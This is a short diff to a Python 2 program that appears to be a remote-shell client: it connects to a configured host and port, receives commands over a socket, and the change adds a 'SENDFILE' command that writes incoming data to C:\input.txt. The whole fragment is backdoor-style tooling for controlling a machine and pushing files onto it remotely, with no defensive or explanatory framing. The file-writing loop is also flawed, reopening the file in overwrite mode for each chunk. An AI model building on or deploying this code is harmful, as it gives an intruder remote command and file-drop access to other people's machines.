@@ -11,6 +11,17 @@ import time
 HOST = '127.0.0.1'   
 PORT = 22
 
+def incomingFile(data, socketHolder):
+    print data
+    nextData = socketHolder.recv(1024)
+    while nextData:
+        if nextData == "FILEDONE": 
+            break
+        else:
+            with open("C:\input.txt", 'w') as file:
+                file.write(nextData)
+            nextData = socketHolder.recv(1024)
+
 def connect((host, port)):
 	socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	socketHolder.connect((host, port))
@@ -19,7 +30,9 @@ def connect((host, port)):
 def run_shell_cmd(socketHolder):
     data = socketHolder.recv(1024)
     if data:
-        if data == "exit":
+        if data == "SENDFILE":
+            incomingFile(data, socketHolder)
+        elif data == "exit":
             socketHolder.send('exit')
             socketHolder.close()
             sys.exit(0)
